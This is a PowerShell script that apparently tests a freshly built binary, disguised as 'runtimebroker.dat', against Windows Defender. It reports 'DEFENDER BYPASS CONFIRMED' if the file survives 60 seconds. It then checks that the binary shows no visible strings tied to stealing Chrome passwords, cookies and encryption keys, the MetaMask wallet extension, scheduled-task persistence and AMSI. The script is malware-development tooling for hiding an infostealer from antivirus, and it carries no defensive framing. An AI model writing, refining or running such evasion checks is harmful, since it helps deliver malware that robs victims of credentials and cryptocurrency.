$f = "build\runtimebroker.dat"
for ($i = 1; $i -le 12; $i++) {
    Start-Sleep -Seconds 5
    $sec = $i * 5
    if (Test-Path $f) { Write-Host "${sec}s ALIVE" }
    else { Write-Host "${sec}s CAUGHT!"; exit 1 }
}
Write-Host "=== 60s SURVIVED - DEFENDER BYPASS CONFIRMED! ==="

# Deep analysis
$bytes = [System.IO.File]::ReadAllBytes($f)
$text = [System.Text.Encoding]::ASCII.GetString($bytes)
$sigs = @("WinHttpOpen","CryptUnprotectData","BCryptDecrypt","nkbihfbeogaeaoehlefnkodbefgpgknn",
          "Google\\Chrome","Login Data","encrypted_key","MetaMask","logins","origin_url",
          "password_value","cookies","schtasks","powershell","amsi.dll")
$found = 0
foreach ($s in $sigs) {
    if (([regex]::Matches($text, [regex]::Escape($s))).Count -gt 0) { Write-Host "  [FOUND] $s"; $found++ }
}
if ($found -eq 0) { Write-Host "ALL SIGNATURES CLEAN" }
Write-Host "Binary size: $((Get-Item $f).Length) bytes"
